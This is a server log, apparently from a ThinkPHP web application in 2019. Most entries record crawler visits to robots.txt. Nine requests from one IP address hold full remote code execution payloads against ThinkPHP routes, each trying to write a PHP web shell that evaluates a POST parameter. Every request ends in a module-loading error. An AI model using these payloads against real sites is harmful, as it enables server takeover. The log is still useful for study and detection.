[ 2019-02-11T04:26:57+08:00 ] 157.55.39.15 /robots.txt
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000006s ]
INFO: [ app_init ] --END-- [ RunTime:0.000192s ]
ERR: 无法加载模块:Robots

[ 2019-02-11T05:14:17+08:00 ] 118.143.205.71 /index.php?s=index/%5Cthink%5CRequest/input&filter=system&data=echo%20%5E%3C?php%20@assert($_POST[mds]);?%5E%3E%20%3Emedusa.php
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000010s ]
INFO: [ app_init ] --END-- [ RunTime:0.000198s ]
ERR: 无法加载模块:Index

[ 2019-02-11T05:14:26+08:00 ] 118.143.205.71 /index.php?s=index/%5Cthink%5Ctemplate%5Cdriver%5Cfile/write&cacheFile=medusa.php&content=%3C?php%20@assert($_POST[mds]);?%3E
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000006s ]
INFO: [ app_init ] --END-- [ RunTime:0.000186s ]
ERR: 无法加载模块:Index

[ 2019-02-11T05:14:34+08:00 ] 118.143.205.71 /index.php?s=index/%5Cthink%5Capp/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=echo%20%5E%3C?php%20@assert($_POST[mds]);?%5E%3E%20%3Emedusa.php
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000007s ]
INFO: [ app_init ] --END-- [ RunTime:0.000191s ]
ERR: 无法加载模块:Index

[ 2019-02-11T05:14:44+08:00 ] 118.143.205.71 /index.php?s=index/%5Cthink%5CContainer/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=echo%20%5E%3C?php%20@assert($_POST[mds]);?%5E%3E%20%3Emedusa.php
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000009s ]
INFO: [ app_init ] --END-- [ RunTime:0.000183s ]
ERR: 无法加载模块:Index

[ 2019-02-11T05:18:19+08:00 ] 118.143.205.71 /index.php?s=index/%5Cthink%5CRequest/input&filter=system&data=echo%20%22%3C?php%20@assert(%5C$_POST[mds]);?%3E%22%20%3Emedus.php
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000007s ]
INFO: [ app_init ] --END-- [ RunTime:0.000183s ]
ERR: 无法加载模块:Index

[ 2019-02-11T05:18:48+08:00 ] 118.143.205.71 /index.php?s=index/%5Cthink%5Ctemplate%5Cdriver%5Cfile/write&cacheFile=medus.php&content=%3C?php%20@assert(%5C$_POST[mds]);?%3E
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000006s ]
INFO: [ app_init ] --END-- [ RunTime:0.000191s ]
ERR: 无法加载模块:Index

[ 2019-02-11T05:19:14+08:00 ] 118.143.205.71 /index.php?s=index/%5Cthink%5Capp/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=echo%20%22%3C?php%20@assert(%5C$_POST[mds]);?%3E%22%20%3Emedus.php
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000006s ]
INFO: [ app_init ] --END-- [ RunTime:0.000172s ]
ERR: 无法加载模块:Index

[ 2019-02-11T05:19:49+08:00 ] 118.143.205.71 /index.php?s=index/%5Cthink%5CContainer/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=echo%20%22%3C?php%20@assert(%5C$_POST[mds]);?%3E%22%20%3Emedus.php
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000006s ]
INFO: [ app_init ] --END-- [ RunTime:0.000169s ]
ERR: 无法加载模块:Index

[ 2019-02-11T05:27:51+08:00 ] 207.46.13.168 /robots.txt
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000006s ]
INFO: [ app_init ] --END-- [ RunTime:0.000171s ]
ERR: 无法加载模块:Robots

[ 2019-02-11T20:46:57+08:00 ] 203.208.60.73 /robots.txt
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000006s ]
INFO: [ app_init ] --END-- [ RunTime:0.000176s ]
ERR: 无法加载模块:Robots

